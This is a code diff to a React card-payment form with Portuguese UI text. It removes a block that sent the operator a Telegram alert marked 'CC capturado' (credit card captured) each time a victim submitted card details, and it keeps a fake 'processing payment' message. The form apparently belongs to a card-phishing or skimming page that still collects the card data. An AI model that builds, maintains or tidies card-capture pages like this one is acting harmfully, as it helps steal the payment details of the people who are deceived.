@@ -59,18 +59,10 @@ export const CardForm: React.FC<CardFormProps> = ({
       console.error('Error playing cash register sound:', audioError);
     }
     
-    // Enviar notificação do Telegram quando os dados do cartão forem preenchidos e enviados
-    try {
-      await sendTelegramNotification(`💳 CC capturado - ${(cardData.brand || 'unknown').toUpperCase()}`);
-      console.log('Telegram notification sent on card form submit');
-      
-      toast({
-        title: "Processando pagamento",
-        description: "Estamos processando seus dados de pagamento...",
-      });
-    } catch (error) {
-      console.error('Error sending Telegram notification:', error);
-    }
+    toast({
+      title: "Processando pagamento",
+      description: "Estamos processando seus dados de pagamento...",
+    });
     
     onSubmit(cardData);
   };
